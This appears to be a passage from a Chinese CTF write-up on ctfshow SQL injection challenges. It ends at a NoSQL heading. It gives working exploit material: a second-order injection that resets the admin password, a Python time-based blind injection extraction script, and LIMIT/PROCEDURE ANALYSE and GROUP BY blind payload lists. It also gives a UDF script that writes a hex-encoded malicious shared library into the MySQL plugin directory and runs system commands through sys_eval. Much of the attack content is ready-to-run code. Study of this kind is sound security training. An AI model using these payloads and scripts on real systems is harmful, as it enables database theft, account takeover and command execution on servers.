![image-20260302144816465](posts/530fceb2/images/image-20260302144816465.webp)

登录成功之后可以修改密码，首页可以进行忘记密码和注册账户

我们首先注册一个脏数据用户

```payload
username:admin'#
password:123
```

再将其忘记密码，后端忘记密码语句为

```mysql
UPDATE users SET PASSWORD='12345' where username='admin'#' and password='123'
```

这样达到越权修改管理员密码的地步，成功修改了admin的管理员密码为12345

![image-20260302151459676](posts/530fceb2/images/image-20260302151459676.webp)

这里可以看到只有admin没有被转义，也只有admin有注入点，并且没有报错输出，只能打盲注了

1. 在注册admin处输入脏数据
2. 登录admin脏数据账户
3. 修改密码进行盲注

```python
import requests
import time

url="http://f35cc01c-e7fb-4dc4-80bf-80d50e336465.challenge.ctf.show/"
param=""

# 设置时间阈值
TIME_THRESHOLD = 2  # 单位：秒

# 传入参数为ascii码中所有可以打印字符
strings="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-_!@#$%^&()"

# 首页
index="login.php"

# 修改密码界面
changePassword="pass_change.php"

# 注册账户界面
register="login_create.php"

proxys = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

flag=""

# 获取数据库长度
# dirtyUsername = f"admin' and if(length((select group_concat(schema_name) from information_schema.schemata))={i},sleep(4),null)-- a"

# 获取数据库名称
# admin' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=1,sleep(4),null)-- a

# 获取数据库表长度
# admin' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1,sleep(4),null)-- a

# 获取数据库表名称
# admin' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1,sleep(4),null)-- a

# 获取数据列长度
# admin' and if(length((select group_concat(column_name) from information_schema.columns where table_name='flagugs' and table_schema='ctfshow'))=1,sleep(4),null)-- a

# 获取数据列名称
# admin' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flagugs' and table_schema='ctfshow'),1,1))=1,sleep(4),null)-- a

# 获取数据项
# admin' and if(ascii(substr((select group_concat(flag43s) from flagugs),1,1))=1,sleep(4),null)-- a

while True:
    for i in range(1,45+1):
        for j in range(1,127+1):
            # 获取数据库长度
            dirtyUsername = f"admin' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))={j},sleep(2),null)-- a"

            # 1. 注册脏用户
            # 提交表单示例：username=1&password=1&re_password=1&submit=Register
            r_register = requests.post(url + register, data={
                "username": f"{dirtyUsername}",
                "password": "123",
                "re_password": "123",
                "submit": "Register"
            }, proxies=proxys)

            s = requests.Session()
            s.proxies.update(proxys)

            r_login = s.post(
                url + index,
                data={
                    "login_user": f"{dirtyUsername}",
                    "login_password": "123",
                    "submit": "Login"
                },
                allow_redirects=False,  # 关键：拿 302 的 Set-Cookie
            )

            # 根据响应时间判断是否注入成功
            # 记录开始时间
            start_time = time.time()
            try:

                # 3. 后续修改密码：直接用同一个 Session 发请求，会自动带上 302 里拿到的 cookie
                r_changePassword = s.post(
                    url + changePassword,
                    data={
                        "current_password": "123",
                        "password": "123",
                        "re_password": "123",
                        "submit": "Reset"
                    },
                )

                # 获取requests请求的回显，并判断回显是否达到时间阈值；
                # 获取响应时间
                elapsed_time = time.time() - start_time

                # 判断响应时间是否超过阈值（笛卡尔积查询成功会耗时）
                if elapsed_time > TIME_THRESHOLD:
                    flag += chr(j)
                    print(f"[+] Current flag: {flag}")
                    break

            except requests.exceptions.Timeout:
                # 如果超时，说明条件为真
                elapsed_time = time.time() - start_time
                flag += chr(j)
                print(f"[+] Current flag: {flag}")
                break

```



### limit注入

  这里以ctfshow-web221为例，题目如下：

![image-20260211170518851](posts/530fceb2/images/image-20260211170518851.webp)

查询语句接收page、limit值，但只影响limit后参数，返回逻辑没有过滤

参考文献：[[转载\]Mysql下Limit注入方法 | 离别歌](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)

limit后可以接两个函数，PROCEDURE 和 INTO，into我们很熟悉了，是用于sql注入写马，这里我们主要考虑procedure

`procedure analyse(max_elements,max_memory)`:max_elements表示分析过程中限制最大的不同元素数量，max_memory表示分析过程中限制最大使用内存。procedure analyse这个函数会对前段sql语句的输出结果进行分析，并给出建议，如下：

```mysql
select * from user procedure analyse(2,16384) # 对user表的查询结果，只分析至少有两个不同结果的列，最大内存16kb

# 输出结果列
Field_name - 字段名

Min_value - 最小值

Max_value - 最大值

Min_length - 最小长度（字符/数字）

Max_length - 最大长度

Empties_or_zeros - 空字符串或零值的数量

Nulls - NULL值的数量

Avg_value_or_avg_length - 平均值或平均长度

Optimal_fieldtype - 推荐的最优数据类型
```

UNION语句中不允许使用`PROCEDURE`子句。
**主要是procedure analyse中可以进行sql语句的执行**

这题我们在procedure analyse中穿插报错注入

```mysql
?page=10&limit=10 procedure analyse(extractvalue(1,concat(0x3a,database())),1);
```

即查询语句修改为

```mysql
select * from ctfshow_user limit 9*10 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);,10 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);;
```

时间注入

```mysql
?page=10&limit=10 procedure analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),null))))),1);
```

### group by 注入

  这里用ctfshow-web222为例，题目如下：
![image-20260211175041748](posts/530fceb2/images/image-20260211175041748.webp)

查询语句为查询一个表的全部数据，并且根据传参username进行排序，这里用if进行用布尔盲注和时间盲注即可

布尔盲注判断：group by 后条件直接使用if的布尔盲注代替即可（推荐）

时间盲注判断：group by 后直接使用if判断，成功即sleep，例如：`group by if(1=1,sleep(4),null)`,但是group by会查询所有行数，所以有多少行就会执行多少次sleep

**having判断**：类似于where，在语法上更被支持，where后接条件判断

+ 布尔盲注

	1. 获取数据库长度

		```mysql
		?u=if(length(database())=1,username,null)-- a
		```

	2. 获取数据库

		```mysql
		?u=if(ascii(substr(database(),1,1))=1,username,null)-- a
		```

	3. 获取数据表长度

		```mysql
		?u=if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1,username,null)-- a
		```

	4. 获取数据表

		```mysql
		?u=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1,username,null)-- a
		```

	5. 获取列长度

		```mysql
		?u=if(length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga' and table_schema=database()))=1,username,null)-- a
		```

	6. 获取列

		```mysql
		?u=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga' and table_schema=database()),1,1))=1,username,null)-- a
		```

	7. 获取flagaabc这一列的数据项长度

		```mysql
		?u=if(length((select group_concat(flagaabc) from ctfshow_flaga))=1,username,null)-- a
		```

	8. 获取flagaabc这一列的数据项

		```mysql
		?u=if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),1,1))=1,username,null)-- a
		```

+ 时间盲注

	1. 获取数据库

		```mysql
		?u=if(ascii(substr(database(),1,1))=1,sleep(1),null)-- a
		```

	2. 获取数据表长度

		```mysql
		?u=if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1,sleep(1),null)-- a
		```

	3. 获取数据表

		```mysql
		?u=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1,sleep(1),null)-- a
		```

	4. 获取列长度

		```mysql
		?u=if(length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga' and table_schema=database()))=1,sleep(1),null)-- a
		```

	5. 获取列

		```mysql
		?u=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga' and table_schema=database()),1,1))=1,sleep(1),null)-- a
		```

	6. 获取flagaabc这一列的数据项长度

		```mysql
		?u=if(length((select group_concat(flagaabc) from ctfshow_flaga))=1,sleep(1),null)-- a
		```

	7. 获取flagaabc这一列的数据项

		```mysql
		?u=if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),1,1))=1,sleep(1),null)-- a
		```

### udf注入

#### udf介绍以及前提条件

参考文章：[ctf.show](https://ctf.show/writeups/704073)

  这里以ctfshow-web248为例，题目如下：

![image-20260301123840321](posts/530fceb2/images/image-20260301123840321.webp)

题目要求使用udf注入，拿到flag

  UDF（User Defined Function，用户自定义函数）注入，允许攻击者通过创建自定义函数来执行系统命令，实现从数据库提权到操作系统。

用C/C++开发，编译成动态链接库（.dll或.so文件），可以在SQL语句中调用。例如：

```mysql
-- 正常UDF使用示例
CREATE FUNCTION my_function RETURNS STRING SONAME 'my_udf.dll';
SELECT my_function('参数');
```

1. 需要满足的条件

	```mysql
	-- 需要满足的条件
	1. MySQL版本：MySQL >= 5.0
	2. 拥有FILE权限（可以读写文件）
	3. 知道插件目录路径
	4. 可以创建/修改文件
	```

2. 获取信息

	```mysql
	-- 查看MySQL版本
	SELECT VERSION();
	
	-- 查看插件目录
	SELECT @@plugin_dir;
	-- Linux: /usr/lib/mysql/plugin/
	-- Windows: C:\Program Files\MySQL\MySQL Server 5.7\lib\plugin\
	
	-- 查看是否有FILE权限
	SELECT file_priv FROM mysql.user WHERE user = 'current_user';
	
	-- 查看secure_file_priv限制
	SELECT @@secure_file_priv;
	-- NULL: 不允许导入导出
	-- 空字符串: 任意目录
	-- 指定路径: 只能在该路径
	```

#### udf注入利用

这是大佬的脚本，参考脚本：[SQL注入 | Lazzaro](https://lazzzaro.github.io/2020/05/16/web-SQL注入/)

```python
#参考脚本
#环境：Linux/MariaDB
import requests
 
url='http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id='
code='7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400'
codes=[]
for i in range(0,len(code),128):
    codes.append(code[i:min(i+128,len(code))])
 
#建临时表
sql='''create table temp(data longblob)'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#清空临时表
sql='''delete from temp'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#插入第一段数据
sql='''insert into temp(data) values (0x{})'''.format(codes[0])
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#更新连接剩余数据
for k in range(1,len(codes)):
    sql='''update temp set data = concat(data,0x{})'''.format(codes[k])
    payload='''0';{};-- A'''.format(sql)
    requests.get(url+payload)
 
#10.3.18-MariaDB    
#写入so文件
sql='''select data from temp into dumpfile '/usr/lib/mariadb/plugin/udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#引入自定义函数
sql='''create function sys_eval returns string soname 'udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#命令执行，结果更新到界面
sql='''update ctfshow_user set pass=(select sys_eval('cat /flag.her?'))'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#查看结果
r=requests.get(url[:-4]+'?page=1&limit=10')
print(r.text)
```

+ code为恶意的so文件

### nosql注入

#### nosql基本概念

